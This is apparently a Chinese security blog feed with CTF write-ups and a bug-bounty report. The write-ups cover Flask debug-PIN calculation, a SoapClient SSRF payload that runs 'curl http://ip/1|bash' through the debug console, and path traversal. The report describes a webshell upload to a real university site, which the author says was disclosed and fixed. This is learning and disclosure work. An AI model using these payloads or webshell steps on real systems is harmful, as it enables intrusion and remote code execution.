src="/Writeup/WEB/2023SCTF-pypyp/image-20230709165034-1shz5ce.png" alt="image">​</p><p>　　传参<code>data</code>​，读取到passwd</p><p>　　​<img src="/Writeup/WEB/2023SCTF-pypyp/image-20230709165053-ub599zt.png" alt="image">​</p><p>　　根据提示读取<code>/app/app.py</code>​，获得源码，开了debug，那就读文件算pin码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">app = <span class="title function_ invoke__">Flask</span>(__name__)</span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.<span class="title function_ invoke__">run</span>(host=<span class="string">&quot;0.0.0.0&quot;</span>,debug=True)</span><br></pre></td></tr></table></figure><h1 id="算pin码"><a href="#算pin码" class="headerlink" title="算pin码"></a>算pin码</h1><ol><li><p>&#x2F;etc&#x2F;passwd</p><p> <img src="/Writeup/WEB/2023SCTF-pypyp/image-20230709170030-fnc5a2p.png" alt="image"></p></li><li><p>&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</p><p> <code>02:42:ac:13:00:02</code>​-&gt;<code>2485378023426</code>​</p></li><li><p>&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id</p><p> <code>349b3354-f67f-4438-b395-4fbc01171fdd</code>​</p></li><li><p>&#x2F;proc&#x2F;self&#x2F;cgroup</p><p> <code>96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687</code>​</p></li></ol><p>　　还有一个<code>moddir</code>​不会找，参考了一下大佬的blog（<a href="https://boogipop.com/2023/06/20/SCTF2023%20Web%20WriteUp/#pypyp">https://boogipop.com/2023/06/20/SCTF2023%20Web%20WriteUp/#pypyp</a>）</p><p>　　​<img src="/Writeup/WEB/2023SCTF-pypyp/image-20230709172555-1mgmt09.png" alt="image">​</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sha1</span></span><br><span class="line">import hashlib</span><br><span class="line"><span class="keyword">from</span> itertools import chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;app&#x27;</span><span class="comment"># /etc/passwd</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;/usr/lib/python3.8/site-packages/flask/app.py&#x27;</span> <span class="comment"># 报错得到(本题没有保报错)</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;248537802342&#x27;</span>,<span class="comment">#  /sys/class/net/eth0/address 16进制转10进制</span></span><br><span class="line">    <span class="comment">#machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span></span><br><span class="line">    <span class="string">&#x27;349b3354-f67f-4438-b395-4fbc01171fdd96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687&#x27;</span><span class="comment">#  /proc/self/cgroup</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.<span class="title function_ invoke__">sha1</span>()</span><br><span class="line"><span class="keyword">for</span> bit in <span class="title function_ invoke__">chain</span>(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> not bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="title function_ invoke__">isinstance</span>(bit, str):</span><br><span class="line">        bit = bit.<span class="title function_ invoke__">encode</span>(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.<span class="title function_ invoke__">update</span>(bit)</span><br><span class="line">h.<span class="title function_ invoke__">update</span>(b<span class="string">&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.<span class="title function_ invoke__">hexdigest</span>()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = None</span><br><span class="line"><span class="keyword">if</span> num is None:</span><br><span class="line">    h.<span class="title function_ invoke__">update</span>(b<span class="string">&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="keyword">int</span>(h.<span class="title function_ invoke__">hexdigest</span>(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =None</span><br><span class="line"><span class="keyword">if</span> rv is None:</span><br><span class="line">    <span class="keyword">for</span> group_size in <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="title function_ invoke__">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.<span class="title function_ invoke__">join</span>(num[<span class="attr">x</span>:x + group_size].<span class="title function_ invoke__">rjust</span>(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x in <span class="title function_ invoke__">range</span>(<span class="number">0</span>, <span class="title function_ invoke__">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(rv)</span><br></pre></td></tr></table></figure><p>　　算出pin码是<code>121-260-582</code>​</p><h1 id="Debug控制台rce"><a href="#Debug控制台rce" class="headerlink" title="Debug控制台rce"></a>Debug控制台rce</h1><h2 id="SSRF拿SECRET"><a href="#SSRF拿SECRET" class="headerlink" title="SSRF拿SECRET"></a>SSRF拿SECRET</h2><blockquote><p>本地抓一下debug验证pin码的包</p><p><img src="/Writeup/WEB/2023SCTF-pypyp/image-20230709174331-oxxm914.png" alt="image">​</p><p>有四个参数：<br><code>__debugger__</code>​：调试<br>​<code>cmd</code>​：命令<br>​<code>pin</code>​：pin码<br>​<code>s</code>​：SECRET</p></blockquote><p>　　SECRET访问console就能获取，那么我们怎么访问console呢<br>还记得上面代码审计中提到的​</p><blockquote><p><code>file_get_contents(&#39;http://127.0.0.1:5000/&#39;.$properties);</code>​：使用输入的<code>$properties</code>​构造URL，并通过<code>file_get_contents</code>​函数获取远程内容。</p></blockquote><p>　　那么我们就通过变量覆盖令<code>properties</code>​为<code>console</code>​，构造出<code>http://127.0.0.1:5000/console</code>​</p><p>　　​<img src="/Writeup/WEB/2023SCTF-pypyp/image-20230709174815-yxxd7gk.png" alt="image"></p><p>　　得到SECRET为<code>ECDJpSJ4XJ5AZJtaxMHT</code>​</p><p>　　​<img src="/Writeup/WEB/2023SCTF-pypyp/image-20230709175349-3a84mu7.png" alt="image"></p><h2 id="原生类soapclient拿shell"><a href="#原生类soapclient拿shell" class="headerlink" title="原生类soapclient拿shell"></a>原生类soapclient拿shell</h2><blockquote><p>本地抓一下进入console后执行命令的包</p><p><img src="/Writeup/WEB/2023SCTF-pypyp/image-20230709180052-lh7pp07.png" alt="image"></p><p>SECRET我们上面已经得到了，还需要<code>cookie_name</code>​和<code>cookie_value</code>​</p></blockquote><p>　　翻一下源码看看<code>cookie_name</code>​和<code>cookie_value</code>​是怎么算的</p><p>　　1、<code>cookie_name</code>​</p><p>　　​<img src="/Writeup/WEB/2023SCTF-pypyp/image-20230709181119-hh42vd3.png" alt="image">​</p><p>　　2、​<code>cookie_value</code>​</p><p>　　​<img src="/Writeup/WEB/2023SCTF-pypyp/image-20230709181158-4aw5ewq.png" alt="image">​</p><p>　　改一下源码就可以输出了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;app&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/usr/lib/python3.8/site-packages/flask/app.py&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485378023426&#x27;</span>, <span class="comment">#  /sys/class/net/eth0/address 16进制转10进制</span></span><br><span class="line">    <span class="comment">#machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span></span><br><span class="line">    <span class="string">&#x27;349b3354-f67f-4438-b395-4fbc01171fdd96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">f&quot;__wzd<span class="subst">&#123;h.hexdigest()[:<span class="number">20</span>]&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">    num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                num[x : x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line">pin = rv</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">f&quot;__wzd<span class="subst">&#123;h.hexdigest()[:<span class="number">20</span>]&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;cookie_name:&quot;</span>+cookie_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash_pin</span>(<span class="params">pin: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> hashlib.sha1(<span class="string">f&quot;<span class="subst">&#123;pin&#125;</span> added salt&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;replace&quot;</span>)).hexdigest()[:<span class="number">12</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;cookie_value:&quot;</span>,<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(time.time())&#125;</span>|<span class="subst">&#123;hash_pin(pin)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>　　​<img src="/Writeup/WEB/2023SCTF-pypyp/image-20230709203814-qdmnfgy.png" alt="image">​</p><p>　　接下来就是构造<code>soapclient</code>​类来执行命令了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$class</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>, <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1:5000/console?&amp;__debugger__=yes&amp;cmd=__import__(&quot;os&quot;).popen(&quot;curl$&#123;IFS&#125;http://ip/1|bash&quot;).read()&amp;frm=0&amp;s=ECDJpSJ4XJ5AZJtaxMHT&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&quot;5x\r\nCookie: __wzdb2a60e2b19822632a67c=1688909956|11b8517fb9fb&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;http://127.0.0.1:5000/&quot;</span>)));</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;properties&#x27;</span> =&gt; <span class="title function_ invoke__">urlencode</span>(<span class="variable">$class</span>));</span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$payload</span>;</span><br></pre></td></tr></table></figure><p>　　拿shell之后suid的curl读&#x2F;flag就完事了</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> 反弹shell </tag>
            
            <tag> CTF </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> 原生类 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次edu站点的文件上传漏洞挖掘</title>
      <link href="/SRC/%E8%AE%B0%E4%B8%80%E6%AC%A1edu%E7%AB%99%E7%82%B9%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
      <url>/SRC/%E8%AE%B0%E4%B8%80%E6%AC%A1edu%E7%AB%99%E7%82%B9%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</url>
      
        <content type="html"><![CDATA[<h1 id="记一次edu站点的文件上传漏洞挖掘"><a href="#记一次edu站点的文件上传漏洞挖掘" class="headerlink" title="记一次edu站点的文件上传漏洞挖掘"></a>记一次edu站点的文件上传漏洞挖掘</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>此漏洞已报送edusrc，且已经通过审核并修复</p><h2 id="可注册站点的发现"><a href="#可注册站点的发现" class="headerlink" title="可注册站点的发现"></a>可注册站点的发现</h2><p>通常使用搜索引擎语法找出目标站点的注册点<br>domain:xx &amp;&amp; (body:”注册” || body:”register”)</p><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>通过语法找到这个站点，是研究生课程申请系统，根据经验这种站点一般都有很多上传的功能点，如头像、简历等</p><p>现在此站点注册一个账号，测试账号：xxxx 密码：123abcABC</p><p>　　​<img src="/SRC/%E8%AE%B0%E4%B8%80%E6%AC%A1edu%E7%AB%99%E7%82%B9%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/net-img-5f896cfd-03c0-406d-a409-045488e33a05-toHFUcao-20230618163812-my06soe.png" alt="null">​</p><p>进入站点后，可以看到有很多研究生课程可以申请</p><p>选择申请某一个研究生</p><p>　　​<img src="/SRC/%E8%AE%B0%E4%B8%80%E6%AC%A1edu%E7%AB%99%E7%82%B9%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/net-img-7a3946d0-7ffb-4533-95fd-7bdd464d324a-Gh3RfFKm-20230618163812-ulnytrj.png" alt="null">​</p><p>　　</p><p>发现有文件上传的功能点，可以上传图片，直接测试一下有没有过滤<br>​<img src="/SRC/%E8%AE%B0%E4%B8%80%E6%AC%A1edu%E7%AB%99%E7%82%B9%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/net-img-455f80ad-3d97-4fff-9938-5613e31642f7-0hv7lh9Q-20230618163813-18l20ru.png" alt="null">​</p><p>上传一个文件抓包修改，经过测试，发现没有检测文件类型和文件内容，但是返回包没有返回上传路径<br>​<img src="/SRC/%E8%AE%B0%E4%B8%80%E6%AC%A1edu%E7%AB%99%E7%82%B9%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/net-img-4bcffe35-1678-429d-b3d2-7d9836dea9aa-vB1WiXuz-20230618163813-xgnl1fd.png" alt="null">​</p><p>　</p><p>修改后缀和内容，因为是后端是java，使用哥斯拉生成的木马<br>​<img src="/SRC/%E8%AE%B0%E4%B8%80%E6%AC%A1edu%E7%AB%99%E7%82%B9%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/net-img-83c4a873-4242-4967-87db-4b2cbfb12918-00biuAFS-20230618163813-83hvwo9.png" alt="null">​</p><p>　</p><p>发现上传成功，接下来就是要寻找上传的文件路径</p><p>经过寻找后，发现刷新网页，发现了请求图片的地址，图片地址应该时按照返回包中的id进行命名的<br>​<img src="/SRC/%E8%AE%B0%E4%B8%80%E6%AC%A1edu%E7%AB%99%E7%82%B9%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/net-img-cf719f3a-aeac-4f39-b2d8-883b1169dc11-PczRur4F-20230618163813-wzm30xs.png" alt="null">​</p><p>尝试访问上传的木马的id，发现页面存在，于是使用哥斯拉进行连接<br>​<img src="/SRC/%E8%AE%B0%E4%B8%80%E6%AC%A1edu%E7%AB%99%E7%82%B9%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/net-img-5c53f635-2d6d-4d98-9cc9-db2a72a19652-6Hb2Bc1z-20230618163813-gk4vcey.png" alt="null">​</p><p>　　url是：<a href="https://xxxxx/files//dopoBasic/08691094210c4d9288a2bdd94b306324.jsp">https://xxxxx/files//dopoBasic/08691094210c4d9288a2bdd94b306324.jsp</a></p><p>　　密码和密钥都是：hack</p><p>　　​<img src="/SRC/%E8%AE%B0%E4%B8%80%E6%AC%A1edu%E7%AB%99%E7%82%B9%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/net-img-3e69906f-032b-4375-9f57-a62f3f60d07f-DsVfPldY-20230618163813-mrebw1w.png" alt="null">​</p><p>　　连接成功，且是root权限</p><p>　　​<img src="/SRC/%E8%AE%B0%E4%B8%80%E6%AC%A1edu%E7%AB%99%E7%82%B9%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/net-img-52084da3-d966-40fe-8221-9bd68b3b54ab-PK00WOD8-20230618163813-rghr6g3.png" alt="null"><br>​<img src="/SRC/%E8%AE%B0%E4%B8%80%E6%AC%A1edu%E7%AB%99%E7%82%B9%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/net-img-795eee36-9a14-477f-84b7-de912e30bc5f-NTMsQ0rr-20230618163813-uvpjga2.png" alt="null">​</p>]]></content>
      
      
      <categories>
          
          <category> SRC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> edusrc </tag>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023ciscn-reading</title>
      <link href="/Writeup/WEB/reading/"/>
      <url>/Writeup/WEB/reading/</url>
      
        <content type="html"><![CDATA[<h1 id="reading"><a href="#reading" class="headerlink" title="reading"></a>reading</h1><h1 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h1><p>　　可以阅读.txt书籍</p><h1 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h1><p>　　通过任意文件读取 读源码</p><p>　　首先尝试 ..&#x2F; 目录穿越，发现 .. 被替换成 . ，改为 …&#x2F; 进行目录穿越</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, render_template, send_file</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = hashlib.md5(os.urandom(<span class="number">32</span>)).hexdigest()</span><br><span class="line">key = hashlib.md5(<span class="built_in">str</span>(time.time_ns()).encode()).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;secret&#x27;</span>,app.secret_key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;key&#x27;</span>,key)</span><br><span class="line">books = os.listdir(<span class="string">&#x27;./books&#x27;</span>)</span><br><span class="line">books.sort(reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> session:</span><br><span class="line">        book = session[<span class="string">&#x27;book&#x27;</span>]</span><br><span class="line">        page = session[<span class="string">&#x27;page&#x27;</span>]</span><br><span class="line">        page_size = session[<span class="string">&#x27;page_size&#x27;</span>]</span><br><span class="line">        total_pages = session[<span class="string">&#x27;total_pages&#x27;</span>]</span><br><span class="line">        filepath = session[<span class="string">&#x27;filepath&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        words = read_file_page(filepath, page, page_size)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, books=books, words=words)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, books=books )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/books&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">book_page</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;book&#x27;</span>):</span><br><span class="line">        book = request.args.get(<span class="string">&#x27;book&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> session:</span><br><span class="line">        book = session.get(<span class="string">&#x27;book&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, books=books, message=<span class="string">&#x27;I need book&#x27;</span>)</span><br><span class="line">    book=book.replace(<span class="string">&#x27;..&#x27;</span>,<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    filepath = <span class="string">&#x27;./books/&#x27;</span> + book</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;page_size&#x27;</span>):</span><br><span class="line">        page_size = <span class="built_in">int</span>(request.args.get(<span class="string">&#x27;page_size&#x27;</span>))</span><br><span class="line">    <span class="keyword">elif</span> session:</span><br><span class="line">        page_size = <span class="built_in">int</span>(session.get(<span class="string">&#x27;page_size&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        page_size = <span class="number">3000</span></span><br><span class="line">    total_pages = math.ceil(os.path.getsize(filepath) / page_size)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span 